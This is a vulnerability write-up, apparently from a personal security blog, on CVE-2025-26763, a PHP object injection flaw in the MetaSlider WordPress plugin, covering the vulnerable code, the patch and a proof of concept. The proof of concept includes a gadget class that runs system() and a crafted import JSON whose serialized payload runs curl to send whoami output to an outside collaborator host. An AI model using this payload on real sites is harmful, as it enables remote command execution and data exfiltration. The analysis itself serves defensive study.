# CVE-2025-26763 Analysis & POC


<!--more-->

## CVE & Basic Info
Deserialization of Untrusted Data vulnerability in MetaSlider Responsive Slider by MetaSlider allows Object Injection. This issue affects Responsive Slider by MetaSlider: from n/a through 3.94.0.

* **CVE ID**: [CVE-2025-26763](https://www.cve.org/CVERecord?id=CVE-2025-26763)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 3.94.0
* **Patched Versions**: 3.95.0
* **CVSS severity**: Medium (9.8)
* **Required Privilege**: Editor
* **Product**: [WordPress Responsive Slider by MetaSlider Plugin](https://wordpress.org/plugins/ml-slider/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Responsive Slider by MetaSlider**:  
    * `3.94.0` – **vulnerable**  
    * `3.95.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Cause
**In the vulnerable version (v3.94.0):**

```php {title="Slideshows.php v3.94.0" data-open=true hl_lines=[6]}
if (isset($slideshow['meta']) && is_array($slideshow['meta'])) {
    foreach ($slideshow['meta'] as $key => $value) {
        update_post_meta(
            $new_slideshow_id,
            $key,
            maybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value))
        );
    }
}
````

In this code, the **`maybe_unserialize()`** function is called directly on user-controlled data (`$value`). Since these values are not validated before being unserialized, an attacker can inject malicious serialized payloads leading to PHP Object Injection.

**Patch (v3.95.0):**

![Diff](diff.png "Patch diff")

The patch adds two critical protections to prevent malicious data from being unserialized:

1. Block any meta value that is a serialized object (O:). If detected, the import process stops and the slideshow is deleted.

```php {title="Slideshows.php v3.95.0" data-open=true hl_lines=[5,17]}
if (isset($slideshow['meta']) && is_array($slideshow['meta'])) {
    foreach ($slideshow['meta'] as $key => $value) {

        // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON
        if ( is_serialized( $value ) && substr( trim( $value ), 0, 2 ) === 'O:' ) {
            wp_trash_post($new_slideshow_id);

            return new WP_Error(
                'import_slideshow_error',
                esc_html__( 'Import file is invalid.', 'ml-slider' )
            );
        }

        update_post_meta(
            $new_slideshow_id,
            $key,
            $this->maybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value))
        );
    }
}
```

2. Replace `maybe_unserialize()` with a safer version using `unserialize(..., ['allowed_classes' => false])` to **prevent object creation** during unserialization.

```php {title="Slideshows.php v3.95.0" data-open=true hl_lines=[3]}
public function maybe_unserialize( $data ) {
    if ( is_serialized( $data ) ) { // Don't attempt to unserialize data that wasn't serialized going in.
        return @unserialize( trim( $data ), array( 'allowed_classes' => false ) );
    }

    return $data;
}
```

This eliminates the PHP Object Injection risk.

## Analysis

The plugin registers a POST API:

```php {title="api.php v3.94.0" data-open=true hl_lines=[4,5]}
protected $namespace = 'metaslider/v1';
register_rest_route($this->namespace, '/slideshow/import', array(array(
    'methods' => 'POST',
    'callback' => array($this->api, 'import_slideshows'),
    'permission_callback' => array($this->api, 'can_access')
)));
```

with callback `import_slideshows` and permission validated via `can_access()`.

```php {title="api.php v3.94.0" data-open=true hl_lines=[4]}
const DEFAULT_CAPABILITY_EDIT_SLIDES = 'edit_others_posts';
public function can_access()
{
    $capability = apply_filters('metaslider_capability', MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES);

    // Check for the nonce on the server (used by WP REST)
    if (isset($_SERVER['HTTP_X_WP_NONCE']) && wp_verify_nonce(sanitize_key($_SERVER['HTTP_X_WP_NONCE']), 'wp_rest')) {
        return current_user_can($capability);
    }

    // This is for when not using Axios (example: callout.php)
    if (isset($_REQUEST['METASLIDER_NONCE']) && wp_verify_nonce(sanitize_key($_REQUEST['METASLIDER_NONCE']), 'metaslider_request')) {
        return current_user_can($capability);
    }

    return false;
}
```

This function only allows users with `edit_others_posts` capability (Editor or higher) to call the API.

It validates in two ways:

1. If the `X-WP-Nonce` header exists, the plugin verifies the `'wp_rest'` nonce and checks the capability.
2. If the `METASLIDER_NONCE` parameter exists, the plugin verifies the `'metaslider_request'` nonce and checks the capability.

If neither is valid, API access is denied.

```php {title="api.php v3.94.0" data-open=true hl_lines=[3,4,15]}
public function import_slideshows($request)
{
    if (!$this->can_access()) {
        $this->deny_access();
    }

    $data = $this->get_request_data($request, array('slideshows'));

    if (!$data['slideshows']) {
        wp_send_json_error(array(
            'message' => __('Nothing to import.', 'ml-slider')
        ), 400);
    }

    $status = $this->slideshows->import((array) json_decode($data['slideshows'], true));

    if (is_wp_error($status)) {
        wp_send_json_error(array(
            'message' => $status->get_error_message()
        ), 400);
    }

    wp_send_json_success($status, 200);
}
```

`import_slideshows()`:

1. **Permission check** – if `can_access()` returns false → block via `deny_access()`.
2. **Extract input data** – get the `slideshows` field; if empty → return “Nothing to import”.
3. **JSON decode and import** – decode `slideshows` and call `$this->slideshows->import()`.
4. **Error handling** – if `WP_Error` returned → send JSON error.
5. **Success** – if no error → send JSON success with import result.

According to `import()`, `$slideshows` is the exported data from **created slideshows**.

> [!QUOTE]
> /**
>
> * Will import slideshows
> *
> * @param array $slideshows - The data generated by the export method
> *
> * @throws Exception - handled within method.
> * @return WP_Error|array - True on success, WP_Error on failure
>   */

```php {title="Slideshows.php v3.94.0" data-open=true hl_lines=[7]}
foreach ($slideshows as $index => $slideshow) {
    ...
    foreach ($slideshow['slides'] as $slide) {
        ...
        foreach ($slide['meta'] as $key => $value) {
            $value = $this->restore_image_urls_from_string($value);
            add_post_meta($new_slide_id, $key, maybe_unserialize($value));
        }
    }
    ...
}
```

The `import()` function loops through each slideshow, then each slide, then each meta. Each meta value is restored using `$this->restore_image_urls_from_string($value)` and stored with `add_post_meta($new_slide_id, $key, maybe_unserialize($value))`. In other words, the code imports the entire slideshow, slides, and meta while processing image URLs and unserializing data before saving to the database.

## Flow

{{< mermaid >}}
graph TD

A["Editor sends POST request → /metaslider/v1/slideshow/import"] --> B["import_slideshows() invoked"]
B --> C{"can_access(): verify nonce + 'edit_others_posts' capability"}
C -- Fail --> Z["deny_access()"]
C -- Pass --> D["Extract 'slideshows' from request"]
D --> E["json_decode(slideshows) → array of slideshow data"]

E --> F["slideshows->import() begins"]

F --> G["foreach ($slideshows as $slideshow)"]
G --> H["foreach ($slideshow['slides'] as $slide)"]
H --> I["foreach ($slide['meta'] as key => value)"]

I --> J["value = restore_image_urls_from_string(value)"]
J --> K{"Is value serialized?"}

K -- Yes --> L["maybe_unserialize(value)"]
K -- No --> M["Store meta normally"]

L --> N{"Does unserialize create an object?"}
N -- Yes --> R["Object Injection → POP chain execution"]
N -- No --> M

M --> O["add_post_meta(new_slide_id, key, value)"]
O --> P["Import continues for remaining slideshows"]

R --> Q["Exploit achieved"]

{{< /mermaid >}}

## Proof of Concept (PoC)

1. Create a test class in `wp-config.php`:

```php
class Evil
{
    public $command = "ls /";
    public function __destruct()
    {
        die(system($this->command));
    }
}
```

2. Create any slideshow, export to get a sample JSON file.
3. Modify the JSON file so that the `ml-slider_type` field (or any iterated field) contains a serialized string.

Example:

```json
{
  "0": {
    "title": "New Slideshow",
    "original_id": 260,
    "meta": {
      "metaslider_slideshow_theme": "a:6:{s:6:\"folder\";s:12:\"default-base\";s:5:\"title\";s:4:\"Base\";s:4:\"type\";s:4:\"free\";s:8:\"supports\";a:1:{i:0;s:4:\"flex\";}s:4:\"tags\";a:0:{}s:11:\"description\";s:37:\"This is the default MetaSlider theme.\";}",
      "ml-slider_settings": "..."
    },
    "slides": [
      {
        "original_id": 265,
        "order": 0,
        "post_excerpt": "",
        "image": "erol-ahmed-305920-unsplash-1",
        "image_alt": "erol-ahmed-305920-unsplash-1",
        "meta": {
          "ml-slider_type": "O:4:\"Evil\":1:{s:7:\"command\";s:74:\"curl http:\/\/9blonkz57zyrp69hwuz5tw0uoluci26r.oastify.com?leadked=$(whoami)\";}",
          "ml-slider_inherit_image_title": "1",
          "ml-slider_inherit_image_alt": "1",
          "ml-slider_crop_position": "center-center",
          "ml-slider_caption_source": "image-caption",
          "_wp_attachment_image_alt": ""
        }
      }
    ]
  },
  "metadata": {
    "version": "3.94.0",
    "date": "2025/11/26"
  }
}
```

4. Re-import the modified JSON file.

![Result](result.png "Result")

## Conclusion

The vulnerability occurs because the plugin calls `maybe_unserialize()` directly on imported data without validation, allowing injection of malicious serialized payloads that lead to PHP Object Injection. Version 3.95.0 fixes this by blocking serialized objects and using a safer unserialize function.

## Key Takeaways

* Never unserialize user-controlled data without validation.
* Import/export features are always sensitive attack surfaces.
* Serialized data (especially starting with `O:`) must be controlled.
* Use `allowed_classes => false` to prevent object creation during unserialize.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress Responsive Slider by MetaSlider Plugin <= 3.94.0 is vulnerable to PHP Object Injection](https://patchstack.com/database/wordpress/plugin/ml-slider/vulnerability/wordpress-slider-gallery-and-carousel-by-metaslider-image-slider-video-slider-plugin-3-94-0-php-object-injection-vulnerability?_s_id=cve)

---

> Author: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/posts/2025-11-26-cve-2025-26763/  

